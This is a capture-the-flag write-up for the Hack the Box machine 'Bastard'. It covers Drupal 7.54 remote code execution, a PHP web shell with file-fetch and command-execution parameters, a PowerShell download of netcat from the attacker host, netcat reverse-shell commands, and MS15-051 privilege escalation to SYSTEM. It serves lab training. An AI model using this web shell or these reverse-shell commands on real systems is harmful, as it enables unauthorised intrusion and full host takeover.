# Overview
Bastard is a vulnerable machine from [Hack the Box](https://www.hackthebox.com) that requires some web app enumeration and using a public exploit for remote code execution on a vulnerable service. The foothold is accomplished after gaining access to a login page, exploiting the file upload to retreive a file from our attacker machine and get a shell back. The privilege escalation is accomplished through enumerating the host for potential exploits, and after finding a kernel vulnerability, grabbing a public exploit to do local privilege escalation. 

## Nmap Scan
sudo nmap -sS -p- `10.10.10.9` -vvv
* 80/tcp    open  http    syn-ack ttl 127
* 135/tcp   open  msrpc   syn-ack ttl 127
* 49154/tcp open  unknown syn-ack ttl 127

## Basic Enumeration
Wfuzz Directory Enumeration
```
"misc"
"themes"
"user"
"0"
"modules"
"scripts"
"node"
"sites"
"includes"
"profiles"
"Misc"
"Themes"
"Scripts"
"rest"
"User"
"Modules"
"Sites"
```
The login page allows us to create new account. We cannot create an account like `'OR 1=1 OR'`. We have to create a regular account. There isn't anything real interesting after signing in as a regular user. 

* Looking more at robots.txt, we can see that php is used on the site.
    * PHP 5.2.4
    * This is the web server: `Drupal 7.54, 2017-02-01`

Digging around, we are able to see this web server is vulnerable to remote code execution, and there are public exploits, one in php available.

* https://www.exploit-db.com/exploits/41564 
* You will need php-curl to be installed to execute this properly.
* This exploit will upload a file onto a specific path on the web server. The path `rest_endpoint` does not exist, but `rest` is on the web server. We changed the name of the file we are going to upload to `dath.php`, and added some additional code to give us additional functionality. 

```php
$phpCode = <<<'EOD'
<?php
	if (isset($_REQUEST['fupload'])) {
		file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.16.5/8000/" . $_REQUEST['fupload']));
	};
	if (isset($_REQUEST['fexec'])) {
		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
EOD;
```
The code executes successfully, and downloads some json files. One such file is interesting, which is the admin login that has their cookie. We can use a browser extension to add the cookie, go to the login portal, and refresh the page. Without even needing a password, we walk right into the web portal. 

## Foothold
Since the php file is uploaded, we can go to the path in the web portal under `/rest/dath.php`, and execute commands on the host. 

* Using the `fexec`, we can execute commands through the browser.
    * `fexec=echo (New-Object System.Net.WebClient).Downloadfile('http://10.10.16.5:8000/nc64.exe','nc64.exe') | powershell -noprofile -`
        * We tried to use the `fupload` command that was also sent as part of the php execution, but it wouldn't work for me.
    * Netcat is a great tool to use in this case, once downloaded onto the victim machine, we can execute a command to get a shell back over netcat.
    * `http://10.10.10.9/dath.php?fexec=nc64.exe -e cmd.exe 10.10.16.5 8081`

Now we are into the machine, and get `user.txt`.

## Local Enumeration
To find some exploits that are easy for us, this server is quite old, so we can run an enumeration script like `PowerUp.ps1,` `Sherlock.ps1`, or `Winpeas.exe`. In this example, we ran `Sherlock.ps1`.

* It is also possible to run `systeminfo`, grab the system info, and run it against `Windows Exploit Suggester`. This is not only available inside of `Metasploit`, but you can also get a version directly in Kali. You can execute it against saved system info like this: 
    * `/home/dathalind/.local/bin/wes system.txt >> exploits.txt`

Sherlock shows us that there are 2 possible exploits: 
```
Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
```

## Privilege Escalation
We end up using the exploit against `MS15-051`, which you can obtain from this github repo [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051). 

* When you run it on the machine, you can just run it against the command `whoami`, and it should return the result of `nt authority\system`. 
* To get a shell, we can run it to execute `nc64.exe` to get an escalated shell back to our attacker machine: 
    * `hax.exe "nc64.exe -e cmd.exe 10.10.16.5 5555"`

We get a shell back, and can now read `root.txt`.
